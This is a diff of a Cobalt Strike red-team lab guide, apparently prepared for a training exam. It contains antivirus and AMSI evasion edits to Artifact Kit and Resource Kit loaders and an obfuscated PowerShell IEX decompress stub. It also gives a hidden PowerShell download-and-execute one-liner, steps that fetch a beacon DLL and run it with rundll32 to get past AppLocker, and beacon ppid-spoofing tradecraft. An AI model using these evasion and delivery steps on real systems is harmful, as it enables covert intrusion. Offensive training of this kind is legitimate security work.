@@ -8,10 +8,10 @@ The objective is to setup Cobalt Strike.  Update Malleable C2 profile, create ar
 * Build **Resource** Kit → fix template.x64.ps1 → ThreatCheck AMSI clean
 * Add Cobalt Strike Listeners 
 * Load CNA CS Script Manager
-* Disable AppLocker intial access
-* Initial Beacon
-* ppid set to explorer.exe PID before `spawnto` and before `execute-assembly` or `powerpick`  
-* `spawnto x64 %windir%\sysnative\werfault.exe` before using fork&run operations `execute-assembly`, `powerpick`  
+* Generate & Host Payloads
+* AppLocker Bypass Initial access
+* Connected Beacon Checklist
+* Local Workstation Enumeration
 * Test beacon callback with Defender ON 🛡️  
 
 ### SSH to team server
@@ -88,23 +88,23 @@ sudo /usr/bin/docker logs cobaltstrike-cs-1
 
 ### Patch patch.c in VSCode
 
->Launch Visual Studio Code > File > Open Folder → `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\` Open `src-common\patch.c`  
+>Launch Visual Studio Code 🔵 > File > Open Folder → `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\` Open `src-common\patch.c`  
 
 ```cpp
-// REPLACE WITH (backwards while loop — different compiled bytecode, identical logic):
+// line 45 REPLACE WITH (backwards while loop — different compiled bytecode, identical logic):
 x = length;
 while ( x-- ) {
     * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
 }
 
-// REPLACE Decryption loop with 
+// line 116 REPLACE Decryption loop with 
 int x = length;
 while ( x-- ) {
     * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
 }
 ```
 
->Build in WSL (Ubuntu)  
+>Build **artifacts** in WSL (Ubuntu)  
 
 ```cpp
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
@@ -114,7 +114,7 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
 
 ### ThreatCheck & Ghidra  
 
-```
+```powershell
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
 ```
 
@@ -123,14 +123,14 @@ C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltst
 
 ## Build Resource Kit  
 
->Build templates in WSL (Ubuntu)  
+>Build **resources** templates in WSL (Ubuntu)  
 
 ```bash
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
 ```
 
->VSCode - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `template.x64.ps1`  
+>Visual Studio Code 🔵 - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `template.x64.ps1`  
 
 >Replace System.dll' with obfuscation:  
 
@@ -142,13 +142,11 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 # 'J1N5cycrJ3RlbS4nKydkbGwnCg==' = base64('Sys'+'tem.'+'dll')
 ```
 
->Replace Marshal.Copy with WriteProcessMemory:  
+>Replace `Marshal.Copy` with WriteProcessMemory:  
 
 ```powershell
 # orginal code detected
-
-$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
-$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
+    [System.Runtime.InteropServices.Marshal]::Copy($v_code, 0, $var_buffer, $v_code.length)
 
 # replacement obfuscated
 
@@ -159,18 +157,20 @@ $var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoi
 $var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
 ```
 
->VSCode - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `compress.ps1` with obfuscation  
+>Visual Studio Code 🔵 - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `compress.ps1` with obfuscation  
 
 ```powershell
 SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
 ```
 
->ThreatCheck AMSI  
+>ThreatCheck 🛡️ AMSI  
 
 ```powershell
 cd C:\Tools\cobaltstrike\custom-resources\
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
 ```
+
+<img src="/images/threatchecks1.png">  
 
 ## Cobalt Strike Listeners  
 
@@ -212,7 +212,7 @@ Go to **Cobalt Strike > Listeners > Add** to create a new listener.
 
 <img src="/images/cs_setup3.png">  
 
-## TCP (local) Listener
+### TCP (local) Listener
 
 1. Name: `tcp-local`
 1. Payload: Beacon TCP
@@ -225,15 +225,18 @@ Go to **Cobalt Strike > Listeners > Add** to create a new listener.
 
 >Script Manager > Load CNA - Aggressor Scripts:  
 
-*    C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
-*    C:\Tools\cobaltstrike\custom-resources\resources.cna
-*    SA.cna  ← MUST be before exam-recon.cna
-*    Remote.cna
-*    kerbeus_cs.cna
-*    exam-recon.cna
-*    sql.cna
+* C:\Tools\cobaltstrike\arsenal-kit\kits\elevate\elevate.cna
+* C:\Tools\CS-Situational-Awareness-BOF\SA\SA.cna  ← MUST be before exam-recon.cna
+* C:\Tools\CS-Remote-OPs-BOF\Remote\Remote.cna
+* C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
+* C:\Tools\cobaltstrike\custom-resources\resources.cna
+* C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
+* C:\Tools\SQL-BOF\SQL\SQL.cna
+* Optional Custom: exam-recon.cna
 
-# Generate Payloads
+----  
+
+# Generate & Host Payloads
 
 > ⚠️ **PREREQUISITE — First Update C2 Malleable Profile**  
 
@@ -241,11 +244,7 @@ Go to **Cobalt Strike > Listeners > Add** to create a new listener.
 
 <img src="/images/malleable-c2-profile-updates.png">  
 
-> 1. Malleable C2 profile active (docker restart)  
-> 2. Artifact Kit built → ThreatCheck clean → `artifact.cna` loaded in Script Manager  
-> 3. Resource Kit built → ThreatCheck AMSI clean → `resources.cna` loaded in Script Manager  
-
-> Now generate payloads — they will use the custom artifact stubs.  
+> Generate payloads will use the custom artifact stubs.  
 
 1. Go to **Payloads > Windows Stageless Generate All Payloads**
 2. Folder: `C:\Payloads`
@@ -253,92 +252,150 @@ Go to **Cobalt Strike > Listeners > Add** to create a new listener.
 
 <img src="/images/generate_payloads.png">  
 
+## Scripted Web Delivery
 
+Host a 64-bit PowerShell payload.  
+```
+Cobalt Strike > Attacks > Scripted Web Delivery
+Select the http listener.
+Click Launch.
+```
 
-# Interact with Beacon
+<img src="/images/scripted-web-delivery-http-listener.png">  
 
-1. Run *C:\Payloads\http_x64.exe* and a new Beacon session should appear.
-1. Familiarise yourself with the client UI and running commands in Beacon.
+>Example given by Cobalt Strike:  
 
-⚠️ Use the `help` command to list all of the available commands, and `help [alias]` to get help for a specific command.
+```
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.0.10:80/a'))"
+```
+
+## Generate Stageless Beacon DLL (Attacker Desktop — CS)
+
+```
+Cobalt Strike > Payloads > Windows Stageless Payload
+  Listener:  http
+  Output:    Windows DLL (x64)
+  Save as:   C:\Payloads\beacon.dll
+```
+
+## Host Payload via CS Web Server
+
+```
+Site Management > Host File
+  File:   C:\Payloads\beacon.dll
+  URI:    /beacon.dll
+  Port:   80
+```
+
+>Example given by Cobalt Strike:  
+
+```
+http://172.16.0.10:80/beacon.dll
+```
+
+# AppLocker Bypass
+
+>Initial Access, Provided credentials, Locally logged onto compromised workstation  
+
+## Enumerate AppLocker Policy
+
+```powershell
+# Confirm AppLocker is enforcing (ConstrainedLanguage = active)
+$ExecutionContext.SessionState.LanguageMode
+
+# Read all effective rules
+$policy = Get-AppLockerPolicy -Effective
+$policy.RuleCollections
+
+# Check if DLL rules are enforced — empty output = DLL rules OFF = rundll32 viable
+$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }
+
+# Find writable dirs inside the allowed %WINDIR%\* path
+icacls C:\Windows\Tasks
+icacls C:\Windows\Temp
+```
+
+# Initial Beacon
+
+>On compromised workstation  
+
+## Download Beacon DLL to Workstation
+
+On `lon-wkstn-1` as `pchilds` — `Invoke-WebRequest` works in ConstrainedLanguage:
+
+```powershell
+cd C:\Windows\Tasks\
+Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
+```
+
+## Execute via rundll32
+
+```cmd
+rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
+```
+
+<img src="/images/applocker-challenge02.png" width=860>
 
 ---
 
+# Connected Beacon Checklist  
 
-
-
-
-
----
-
-## First Beacon Checklist  
-
-**Step 1 — beacon context (do this first, every beacon):**
+>>[Initial Access without phishing in exam](/labs/Initial-Access-lab.md) beacon commands:  
+* ppid set to explorer.exe PID before `spawnto` and before `execute-assembly` or `powerpick`  
+* `spawnto x64 %windir%\sysnative\werfault.exe` before using fork&run operations `execute-assembly`, `powerpick`  
 
 ```cs
-beacon> sleep 3 20                                      // reduce check-in noise
-beacon> ps                                              // get process list
-beacon> ppid <explorer.exe or svchost.exe PID>          // spoof parent — see note below
-beacon> spawnto x64 %windir%\sysnative\werfault.exe     // override default rundll32
-beacon> getuid                                          // confirm user context
+sleep 3 20                                      // reduce check-in noise
+ps                                              // get process list
+process_browser
+ppid <explorer.exe or svchost.exe PID>          // spoof parent — see note below
+spawnto x64 %windir%\sysnative\werfault.exe     // override default rundll32
+getuid                                          // confirm user context
 ```
 
-**Step 2 — ldapsearch immediately after (OPSEC-🟢SAFE — do this on every beacon without exception):**
+# Methodology Phases  
 
-ldapsearch is a BOF — no child process, no event logs, runs in beacon thread. It is the
-fastest and safest way to map the entire domain. Run it before making any attack decisions.
+>Loop through phases:
+* enumeration
+* post exploit
+* persistence
+* enumerate more
+* privilege escalate
+* elevated persistence
+* enumerated domain users, computers, groups
+* privlege escalate in domain
+* ADCS and SQL enumeration
+* trusts enumeration
+* pivot and tunneling
+
+## Initial Persistence
+
+>On initial compromised workstation obtain persistence
+>[Initial Persistence on first beacon](/labs/Persistence-lab.md)  
+
+## Post Exploitation Enumeration  
+
+>[Post Exploitation Checks](/cheatsheets/post-exploitation.md)  
+
+>commands to execute on workstation
+>find other users, local privilege escalation, local workstation persistence, before moving to domain enumeration.  
+
+## Privilege Escalation  
+
+>[Privilege Escalation via weak service registry permissions to SYSTEM Beacon](/labs/Privilege-Escalation-lab.md)  
+
+## AD Discovery  
+
+>[Active Directory Discovery and Enumeration](/labs/Discovery-lab.md)  
+>Enumerate domain users, computers, groups, objects — OPSEC-🟢SAFE  
+> ⚠️ ldapsearch also requires a valid Kerberos token — see note in Discovery lab.  
 
 ```cs
-// Single query — hits users, computers, and groups in one shot
-beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
-
-// Trust enumeration
-beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes
+ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes name,samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
 ```
 
-**What to look for immediately in the output:**
+>Domain Trust enumeration  
 
-| Finding | Next action |
-|---------|------------|
-| Account with `servicePrincipalName` set | Kerberoast candidate |
-| `adminCount=1` with no DA group membership | Leftover ACLs — check with BloodHound |
-| `trustPartner` results | Forest/domain trust attack paths |
-| Computer names and roles (DB, FS, DC) | Plan lateral movement targets |
-
----
-
-### `ppid` — No `explorer.exe` on WinRM Beacons
-
-`explorer.exe` only runs in **interactive desktop sessions** (console or RDP login).
-A beacon landed via `jump winrm64` runs inside `wsmprovhost.exe` — no interactive session,
-no explorer.exe in the process list.
-
-**Use `svchost.exe` as the ppid target instead:**
-
-```cs
-beacon> ps                          // find a svchost.exe PID running as SYSTEM or LOCAL SERVICE
-beacon> ppid <svchost.exe PID>      // svchost spawning werfault = normal Windows behaviour
+```bash
+ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes
 ```
-
-| Beacon landed via | `ppid` target |
-|---|---|
-| WinRM (`jump winrm64`) | `svchost.exe` |
-| Interactive user session | `explorer.exe` |
-| Service execution | `services.exe` or `svchost.exe` |
-
----
-
-### `net computers` — OPSEC-🔴UNSAFE, and Fails from WinRM Token
-
-`net computers` spawns `cmd.exe` as a child process — visible to Sysmon Event 1 and EDR.
-It also fails with **Error 5 (Access Denied)** from a WinRM Type 3 network logon token
-because the non-interactive token lacks sufficient privileges for domain enumeration over the network.
-
-**Never use `net computers`. Use ldapsearch BOF instead (OPSEC-🟢SAFE):**
-
-```cs
-// Enumerate domain computers — OPSEC-🟢SAFE (BOF, no child process)
-beacon> ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
-```
-
-> ⚠️ ldapsearch also requires a valid Kerberos token — see note in Discovery lab.
